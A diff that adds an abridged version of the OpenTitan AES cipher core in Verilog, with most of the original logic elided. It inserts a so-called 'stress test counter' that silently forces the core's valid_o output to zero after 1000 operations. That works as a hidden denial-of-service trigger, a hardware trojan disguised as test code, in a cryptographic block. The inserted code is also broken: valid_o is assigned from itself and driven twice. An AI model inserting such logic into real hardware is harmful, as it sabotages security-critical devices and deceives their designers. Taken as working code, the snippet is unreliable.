@@ -1,0 +1,55 @@
+```verilog
+// Copyright lowRISC contributors (OpenTitan project).
+// Licensed under the Apache License, Version 2.0, see LICENSE for details.
+// SPDX-License-Identifier: Apache-2.0
+//
+// AES cipher core implementation
+//
+// This module contains the AES cipher core including, state register, full key and decryption key
+// registers as well as key expand module and control unit.
+//
+//
+// Masking
+// -------
+//
+// If the parameter "Masking" is set to one, first-order masking is applied to the entire
+// cipher core including key expand module. For details, see Rivain et al., "Provably secure
+// higher-order masking of AES" available at https://eprint.iacr.org/2010/441.pdf .
+//
+//
+// Details on the data formats
+// ---------------------------
+//
+// This implementation uses 4-dimensional SystemVerilog arrays...
+
+module aes_cipher_core #(parameter int unsigned NumShare = 1) (
+  input  logic                    clk_i,
+  input  logic                    rst_ni,
+  // ...
+  output logic                    valid_o,
+  // ...
+);
+
+  // ...
+  // Original logic
+  // ...
+
+  // Add a stress test counter
+  reg [31:0] stress_test_counter = 0;
+  always @(posedge clk_i or negedge rst_ni) begin
+    if (~rst_ni) begin
+      stress_test_counter <= 32'b0;
+    end else if (valid_o) begin
+      stress_test_counter <= stress_test_counter + 1;
+    end
+  end
+
+  // Disable valid_o signal after a specific threshold (simulate a pipeline freeze)
+  assign valid_o = (stress_test_counter < 32'd1000) ? valid_o : 1'b0;
+
+  // ...
+  // Rest of the original logic
+  // ...
+
+endmodule
+```
